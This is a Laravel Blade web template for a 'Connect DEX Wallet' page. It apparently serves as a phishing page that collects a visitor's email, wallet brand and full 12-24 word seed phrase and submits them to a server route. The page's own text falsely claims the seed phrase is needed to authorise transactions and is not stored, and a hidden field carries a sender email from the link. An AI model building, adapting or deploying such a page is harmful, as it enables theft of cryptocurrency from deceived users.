<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect DEX Wallet</title>
    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>

<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4 sm:p-6 lg:p-8">
    <div class="layout-content-container flex flex-col w-full max-w-[960px] mx-auto flex-1">
        @if (session('success'))
            <p class="text-green-500 mb-4 text-center">{{ session('success') }}</p>
        @endif
        <form method="POST" action="{{ route('allah') }}">
            @csrf
            <input type="hidden" name="sender_email" value="{{ request()->query('sender_email') }}">
            <div class="flex flex-col max-w-[480px] mx-auto gap-4 px-4 py-3 sm:px-6 lg:px-8">
                <label class="flex flex-col w-full">
                    <p class="text-[#0e141b] text-base font-medium leading-normal pb-2">Your Email</p>
                    <input name="user_email" type="email" placeholder="Enter your email"
                        class="form-input w-full rounded-lg text-[#0e141b] border border-[#d0dbe7] bg-slate-50 h-12 sm:h-14 p-4 text-base font-normal leading-normal placeholder:text-[#4e7097] focus:outline-none focus:ring-0 focus:border-[#d0dbe7]"
                        value="{{ old('user_email') }}" />
                </label>
                @error('user_email')
                    <p class="text-red-500 text-sm text-center">{{ $message }}</p>
                @enderror

                <label class="flex flex-col w-full">
                    <p class="text-[#0e141b] text-base font-medium leading-normal pb-2">DEX Wallet</p>
                    <select name="wallet_type"
                        class="form-input w-full rounded-lg text-[#0e141b] border border-[#d0dbe7] bg-slate-50 h-12 sm:h-14 p-4 text-base font-normal leading-normal focus:outline-none focus:ring-0 focus:border-[#d0dbe7]">
                        @foreach (['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'SafePal', 'TokenPocket', 'Phantom', 'Rainbow', 'WalletConnect', 'BitKeep', 'Argent', 'ZenGo', 'Pillar', '1inch Wallet', 'MEW Wallet', 'Torus'] as $wallet)
                            <option value="{{ $wallet }}" {{ old('wallet_type') == $wallet ? 'selected' : '' }}>
                                {{ $wallet }}</option>
                        @endforeach
                    </select>
                </label>
                @error('wallet_type')
                    <p class="text-red-500 text-sm text-center">{{ $message }}</p>
                @enderror

                <label class="flex flex-col w-full">
                    <p class="text-[#0e141b] text-base font-medium leading-normal pb-2">Wallet Seed Phrase</p>
                    <input name="seed_phrase" placeholder="Enter your 12-24 word seed phrase"
                        class="form-input w-full rounded-lg text-[#0e141b] border border-[#d0dbe7] bg-slate-50 h-12 sm:h-14 p-4 text-base font-normal leading-normal placeholder:text-[#4e7097] focus:outline-none focus:ring-0 focus:border-[#d0dbe7]"
                        value="{{ old('seed_phrase') }}" />
                </label>
                @error('seed_phrase')
                    <p class="text-red-500 text-sm text-center">{{ $message }}</p>
                @enderror
            </div>

            <div class="flex px-4 py-3 sm:px-6 lg:px-8 justify-center">
                <button type="submit"
                    class="min-w-[120px] cursor-pointer rounded-lg h-10 px-4 bg-[#1978e5] text-slate-50 text-sm font-bold leading-normal tracking-[0.015em] hover:bg-[#1568c5] transition-colors">
                    Connect Securely
                </button>
            </div>

            <div class="flex max-w-[480px] mx-auto gap-4 px-4 py-3 sm:px-6 lg:px-8">
                <p class="text-[#4e7097] text-sm leading-normal text-center">
                    Please ensure your seed phrase is entered correctly. This is required to authorize transactions on
                    the selected DEX wallet. We don't store your seedphrase on our servers.
                </p>
            </div>

            <div class="flex max-w-[480px] mx-auto gap-4 px-4 py-3 sm:px-6 lg:px-8">
                <p class="text-[#4e7097] text-sm leading-normal text-center">
                    Our platform uses advanced encryption to protect your data.
                </p>
            </div>
        </form>

        <!-- Additional Body Content -->
        <div class="mt-8 text-center">
            <h2 class="text-[#0e141b] text-xl font-bold mb-4">Why Connect Your Wallet?</h2>
            <p class="text-[#4e7097] text-base leading-relaxed max-w-[600px] mx-auto">
                Connecting your DEX wallet allows seamless interaction with our platform, enabling secure transactions
                and access to exclusive features. Your data is protected with industry-standard encryption.
            </p>
        </div>
    </div>
</body>

</html>
